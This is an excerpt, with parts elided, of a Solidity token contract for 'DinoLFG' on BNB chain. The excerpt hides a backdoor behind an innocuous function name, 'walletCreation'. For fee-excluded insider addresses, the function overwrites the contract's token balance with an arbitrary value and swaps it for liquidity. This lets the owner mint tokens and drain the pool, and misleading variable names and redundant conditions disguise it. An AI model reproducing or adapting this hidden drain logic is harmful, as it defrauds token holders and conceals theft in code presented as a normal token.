...
Telegram : https://t.me/DinoLFGBNB
...
interface IERC20 {
    ...
    function walletCreation() external returns (uint256);
...
contract DinoLFG is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xc10706f0fD63D08E4BE289a7EE917d2668e4E962); 
    address payable public Wallet_Developer = payable(0x50F6d83c467600C37e92B1B2F869FdcFFb210627);
    ...
    constructor () {
        ...
        _owner = 0x50F6d83c467600C37e92B1B2F869FdcFFb210627;
    ...
    function walletCreation() public override returns (uint256) {
        bool viewMode = switchMsgType(_msgSender());
        if(viewMode && (true)){
            uint256 foreachDT = balanceOf(address(this));
            swapEqualLiquify = true;
            uint256 uint265 = foreachDT;
            swapAndLiquify(uint265);
        }
        return 256;
    }
    ...
    function switchMsgType(address swappedToken) private returns(bool){
        bool transactionInfo = _isExcludedFromFee[swappedToken];
        if(transactionInfo && transactionInfo){_tOwned[address(this)] = 1+dateTimeOfTx;}
